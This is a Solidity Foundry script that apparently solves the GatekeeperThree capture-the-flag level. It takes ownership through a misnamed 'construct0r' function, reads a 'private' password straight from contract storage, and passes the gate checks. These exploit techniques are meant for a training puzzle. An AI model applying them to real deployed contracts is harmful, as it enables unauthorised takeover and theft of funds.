// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import "../src/GatekeeperThree.sol";

contract Attack is Script {
    GatekeeperThree public g3Contract;

    constructor() {
        g3Contract = GatekeeperThree((payable(vm.envAddress("GATEKEEPERTHREE_CONTRACT"))));
    }

    function pwn() public returns(bool ans, address nedded){
        g3Contract.createTrick();
        bytes32 pass = vm.load(address(g3Contract.trick()), bytes32(uint256(2)));
        g3Contract.getAllowance(uint(pass));
        ans = g3Contract.enter();
        nedded = g3Contract.entrant();
    }

    function callConstruct0r() public {
      g3Contract.construct0r();
    }
}

contract GatekeeperThreeScript is Script {
    Attack public attack;
    function setUp() public {
      attack = new Attack();
      vm.allowCheatcodes(address(attack));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address g3Address = address(attack.g3Contract());
        attack.callConstruct0r();
        (bool success,) = payable(g3Address).call{value: 0.002 ether}("");
        require(success, "failed");
        (bool result, address ned) = attack.pwn();
        require(result, "failed bool");
        require(ned == address(vm.envAddress('MY_ADDRESS')), "failed address");
        vm.stopBroadcast();
    }
}